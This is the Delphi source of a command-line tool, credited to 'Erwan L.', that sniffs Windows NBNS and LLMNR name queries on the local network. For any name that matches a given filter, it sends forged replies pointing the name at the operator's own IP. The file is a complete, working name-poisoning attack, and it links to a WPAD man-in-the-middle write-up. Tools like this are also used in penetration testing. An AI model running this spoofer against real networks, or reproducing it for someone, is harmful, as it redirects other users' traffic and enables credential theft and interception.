{$r uac.res}
program snif;
{$APPTYPE CONSOLE}
uses
  windows,
  sysutils,
  winsock,
  Tsniffer in 'Tsniffer.pas',
  ipheader in 'ipheader.pas',
  packet in 'packet.pas';

type tobj= class(Tobject)
private
Procedure AnalysisDataPacket(data:pointer;recvsize:word;ptime:pchar);
protected
public
end;

PNBNS_Header = ^NBNS_Header;
NBNS_Header = Packed record
  tid : word;
  flags     : word;    //opcode(5bytes)+nm_flags(7bytes)+rcode(4bytes)
  QDCOUNT    : word;
  ANCOUNT:word;
  NSCOUNT:word;
  ARCOUNT:word;
  data:array[0..0] of char; //will contain NBNS_RESOURCERECORD
end;

var
cpt:integer;
Msg: TMSG;
raw_sniffer:TRawSniffer ;
obj:tobj;
filter:string;

function _String2IP(ip:string):dword;
begin
result:=inet_Addr(PChar(ip));
end;

function _IPToString(LeWord: LongWord): String;
var
 Adr : TInAddr ;
begin
//strpas(inet_ntoa(tinaddr(pchar(leword))))
 Adr.S_addr := LeWord ;
 result := inet_ntoa(Adr) ;
end;

//encodenbt('TOTO',#20);
function encodenbt(name:string;recordtype:char):string;
var
 b,l,h : Byte;
 str,stemp : String;
 i : Integer;
begin
name:= name + StringOfChar(' ',16 - Length(name));
name[16]:=recordtype;
For i:= 1 To 16 do
begin
     b:=ord(name[i]);
     stemp:=inttohex(b,2);
     l:=strtoint('$'+stemp[1]);
     h:=strtoint('$'+stemp[2]);
     str:= str + Chr(l + $41) + Chr(h + $41);
end;
result:=str;
end;


function decodenbt(nbtname:string):string;
var
 i : Integer;
 str : String;
 name : String;
 s1,s2:string[1];
begin
For i := 1 To 16
do begin
   s1:=copy(nbtname, i * 2 - 1, 1);   s2:=copy(nbtname, i * 2 , 1);
    str := inttohex(ord(s1[1]) - $41,1) + inttoHex(ord(s2[1]) - $41,1);

  if i=16 then
	begin
	name := name + '<'+str+'>';
	end
	else
	begin
	str:='$'+str;
	name := name + Chr(strtoint(str));
	end;
end;
result := name;
end;

//https://www.netresec.com/?page=Blog&month=2012-07&post=WPAD-Man-in-the-Middle
procedure respond(tid:word;name,src_ip,dest_ip:string;src_port,dest_port:word);
const
nbns:array [1..62] of byte=(
$87,$62,$85,$80,$00,$00,$00,$01,$00,$00,$00,$00,$20,$45,$45,$45,
$46,$45,$4d,$46,$41,$45,$49,$45,$4a,$45,$4f,$45,$46,$43,$4e,$46,
$41,$45,$44,$44,$43,$43,$41,$43,$41,$43,$41,$41,$41,$00,$00,$20,
$00,$01,$00,$03,$f4,$80,$00,$06,$00,$00,$01,$02,$03,$04);
var
pos:byte;
buf:array[1..62] of byte;
encoded:string;
dwip:dword;
msg:string;
begin
fillchar(buf,sizeof(buf),0);
//***************************************
if src_port =138 then //NBNS
begin
//original buffer which we are going to modify to our needs
copymemory(@buf[1],@nbns[1],62);
tid:=htons(tid);
copymemory(@buf[1],@tid,2);
//
encoded:=encodenbt(name,#0);
copymemory(@buf[14],@encoded[1],32);
//
dwip:=_string2ip(src_ip );
copymemory(@buf[59],@dwip,4);
//use a string as data buffer
setlength(msg,62);
CopyMemory(@msg[1],@buf[1],62);
end;
//***************************************
if src_port =5355 then //LLMNR
begin
tid:=htons(tid);
copymemory(@buf[1],@tid,2);
buf[3]:=$80; {BinToDec('10000000');}buf[4]:=0; //flags  
buf[5]:=0;buf[6]:=1; //qdcount 1 even for a response?
buf[7]:=0;buf[8]:=1; //ancount
buf[9]:=0;buf[10]:=0; //nscount
buf[11]:=0;buf[12]:=0; //arcount
//query OK
buf[13]:=length(name);
copymemory(@buf[14],@name[1],length(name));
pos:=14+length(name)+1;
buf[pos]:=0;buf[pos+1]:=$01; //type $01=A //$1c=aaaa
inc(pos,2);
buf[pos]:=0;buf[pos+1]:=1; //class IN
inc(pos,2);
//answer OK
buf[pos]:=length(name);
inc(pos);
copymemory(@buf[pos],@name[1],length(name));
pos:=pos+length(name)+1; //0 terminated
//
buf[pos]:=0;buf[pos+1]:=$01; //type A
inc(pos,2);
buf[pos]:=0;buf[pos+1]:=1; //class IN
inc(pos,2);
//
buf[pos]:=0;buf[pos+1]:=0;buf[pos+2]:=0;buf[pos+3]:=$1e;  //TTL 30
inc(pos,4);
//
buf[pos]:=0;buf[pos+1]:=4; //resourcedatalength
inc(pos,2);
dwip:=_string2ip(src_ip );
copymemory(@buf[pos],@dwip,4);
inc(pos,4);


setlength(msg,pos-1);
CopyMemory(@msg[1],@buf[1],pos-1);
end;
//dest_ip:='1.2.3.4'; //debug to capture local traffic in wireshark
//***************************************
writeln('sending '+name+'='+src_ip+' to '+dest_ip+':'+inttostr(dest_port));
//src port = 138, dest port = 137 -> NBNS
//src port = sender port , dest port = 5355 -> LLMNR
if SendIt(src_ip,src_port ,dest_ip ,dest_port ,msg)=0 then writeln('sendit failed');
//***************************************

end;

procedure parse(buf:pchar;dest_ip:string;src_port,dest_port:word);
var
pdata:pchar;
i:byte;
stemp:string;
ip:dword;
w,type_:word;
begin
writeln('TID:$'+inttohex(ntohs(PNBNS_Header(@buf[0]).tid),2));
writeln('Flags:$'+inttohex(ntohs(PNBNS_Header(@buf[0]).flags),2));
writeln('qdcount:'+inttostr(ntohs(PNBNS_Header(@buf[0]).qdcount))+' '+
        'Ancount:'+inttostr(ntohs(PNBNS_Header(@buf[0]).Ancount))+' '+
        'Nscount:'+inttostr(ntohs(PNBNS_Header(@buf[0]).nscount))+' '+
        'Arcount:'+inttostr(ntohs(PNBNS_Header(@buf[0]).Arcount)));

if ntohs(PNBNS_Header(@buf[0]).qdcount)>=1 then  //this is a question
              begin
              pdata:=PNBNS_Header(@buf[0]).data;

              if dest_port=137 then  //NBNS
                begin
                for i:=0 to 31 do stemp:=stemp+pnbns_query(@pdata[0]).question_name[i];
                stemp:=decodenbt(stemp);
                writeln('Query:'+stemp);
                type_:=ntohs(pnbns_query(@pdata[0]).QUESTION_TYPE);
                writeln('QUESTION_TYPE:$'+inttohex(type_,2));
                writeln('QUESTION_CLASS:$'+inttohex(ntohs(pnbns_query(@pdata[0]).QUESTION_CLASS),2));
                end;

              if dest_port=5355 then  //LLMNR
                begin
                copymemory(@i,@buf[12],1);
                setlength(stemp,i);
                copymemory(@stemp[1],@buf[13],i);
                writeln('Query:'+stemp);
                copymemory(@w,@buf[13+i+1],2);
                type_:=ntohs(w);
                writeln('QUESTION_TYPE:$'+inttohex(type_,2));
                copymemory(@w,@buf[13+i+1+2],2);
                writeln('QUESTION_CLASS:$'+inttohex(ntohs(w),2));
                end;

              if pos(filter,lowercase(stemp))>0 then
                begin
                if dest_port=137 then respond(ntohs(PNBNS_Header(@buf[0]).tid),stemp,raw_sniffer.str_ip,dest_ip,138,src_port);
                if (type_=1) and (dest_port=5355) then respond(ntohs(PNBNS_Header(@buf[0]).tid),stemp,raw_sniffer.str_ip,dest_ip,5355,src_port);
                end;
              writeln('**********************************');
              end;

if ntohs(PNBNS_Header(@buf[0]).ancount)>=1 then   //this is answer
              begin
              pdata:=PNBNS_Header(@buf[0]).data;
              for i:=0 to 31 do stemp:=stemp+pnbns_RESOURCERECORD(@pdata[0]).rr_name[i];
              stemp:=decodenbt(stemp);
              writeln('rr_name:'+stemp);
              if ntohs(pnbns_RESOURCERECORD(@pdata[0]).rr_type)=$20 then
                 begin
                 copymemory(@ip,@pdata[46],4);
                 writeln('IP:'+_iptostring(ip));
                 end;
              writeln('**********************************');
              end;
end;




Procedure Tobj.AnalysisDataPacket(data:pointer;recvsize:word;ptime:pchar);
Var
  //iRet,
  count: Integer;
  //buf: Array[0..MAX_CHAR] Of char;
  parpheader:parp_header;
  pipheader: PIP_Header; // PIP_Header
  //ptcpheader:PTCP_Header;
  //pudpheader:PUDP_Header;
  pbuf: pchar;
  i,j,k: Integer;
  //str: String;
  //s: String;
  src_port,dest_port:word;
  s,str_time,str_prot,str_srcip,str_destip,str_scrport,str_destport,str_len:string;
  ptr:pointer;
Begin
//sanitary checks
if data=nil then exit;
if (recvsize<=0) or (recvsize>1514) then exit;
//
src_port:=0;dest_port:=0;
str_prot:='';str_srcip:='';str_destip:='';
str_len:='';
    //ip
        pipheader := PIP_Header(data);

//on recupere nos valeurs
      str_time:=FormatDateTime('hh:nn:ss:zzz', now);
      str_len:=inttostr(ntohs(pipheader.ip_totallength));
      str_srcip:=strpas(Inet_Ntoa(TInAddr(pipheader.ip_srcaddr)));
      str_destip:=strpas(Inet_Ntoa(TInAddr(pipheader.ip_destaddr)));

      For i := 0 To 8 Do
      If pipheader.ip_protocol = IPPROTO[i].itype Then str_prot := IPPROTO[i].name;

      //tcp
      If pipheader.ip_protocol=6 then
      begin
           {
           ptcpheader := PTCP_Header(@pipheader.data );
           src_port:=   ntohs(ptcpheader.src_portno ) ;
           dest_port:= ntohs(ptcpheader.dst_portno )  ;
           }
           src_port:=   ntohs(PTCP_Header(@pipheader.data ).src_portno ) ;
           dest_port:= ntohs(PTCP_Header(@pipheader.data ).dst_portno )  ;
      end;
      //udp
      If pipheader.ip_protocol=17 then
      begin
           {
           pudpheader := PUDP_Header(@pipheader.data );
           src_port:=   ntohs(pudpheader.src_portno ) ;
           dest_port:= ntohs(pudpheader.dst_portno )  ;
           }
           src_port:=   ntohs(PUDP_Header(@pipheader.data ).src_portno ) ;
           dest_port:= ntohs(PUDP_Header(@pipheader.data ).dst_portno )  ;
           if {(src_port =137) and} (dest_port =137) then
            begin
            writeln(str_time+'-'+'('+str_prot+')'+str_srcip+':'+inttostr(src_port)+'->'+str_destip+':'+inttostr(dest_port)+' , '+str_len + ' Bytes');
            parse(@PUDP_Header(@pipheader.data ).data,str_srcip,src_port,dest_port);
            end;
           if {(src_port =137) and} (dest_port =5355) then
            begin
            writeln(str_time+'-'+'('+str_prot+')'+str_srcip+':'+inttostr(src_port)+'->'+str_destip+':'+inttostr(dest_port)+' , '+str_len + ' Bytes');
            parse(@PUDP_Header(@pipheader.data ).data,str_srcip,src_port,dest_port );
            end;
      end;

//writeln(str_time+'-'+'('+str_prot+')'+str_srcip+':'+inttostr(src_port)+'->'+str_destip+':'+inttostr(dest_port)+' , '+str_len + ' Bytes');
End;



begin
if paramcount=0 then
  begin
  writeln('snif localip nbtname');
  exit;
  end;
if paramcount<2 then exit;  
raw_sniffer:=TRawSniffer.Create ;
raw_sniffer.promisc :=true;    //useless for now...
filter:=lowercase(paramstr(2));
raw_sniffer.str_ip :=paramstr(1);
raw_sniffer.OnPacket :=obj.AnalysisDataPacket ;
raw_sniffer.opensocket_;
writeln('raw sniffer by Erwan L.');
writeln('sniffing on '+raw_sniffer.str_ip);
while (GetMessage(Msg,0,0,0))   do
begin
{these will get the messages to the window they should go to}
  TranslateMessage(Msg);
  DispatchMessage(Msg);
  if HiWord(GetAsyncKeyState(VK_ESCAPE)) <> 0 then break;
end;
raw_sniffer.closesocket_ ;
end.